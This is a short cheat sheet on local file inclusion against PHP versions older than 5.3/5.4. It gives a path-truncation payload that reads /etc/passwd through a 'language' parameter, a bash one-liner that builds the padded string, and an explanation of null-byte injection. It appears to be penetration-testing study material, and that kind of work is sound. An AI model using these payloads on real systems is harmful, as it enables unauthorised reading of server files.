<h1 align="center">Local File Inclusion (LFI) OLD PHP Version 5.3/5.4 Cheat Sheet</h1>

<p align="center">
  They only work with PHP versions prior to 5.3/5.4
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Web_Security-111827?style=for-the-badge&logo=owasp&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/OffSec-Techniques-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/LFI-Local_File_Inclusion-111827?style=for-the-badge&logoColor=00FFFF">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

> In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored.

## Path Truncation

```
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

We don't have to manually type ./ 2048 times (a total of 4096 characters).

```
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```


## Null Bytes

> PHP versions prior to 5.5 were vulnerable to null byte injection, meaning that appending a null byte (%00) to the end of a string would terminate it, causing anything following the null byte to be ignored. This is due to how strings are stored in low-level memory, where they require a null byte to mark the end of the string—a convention found in languages ​​such as Assembly, C, and C++.

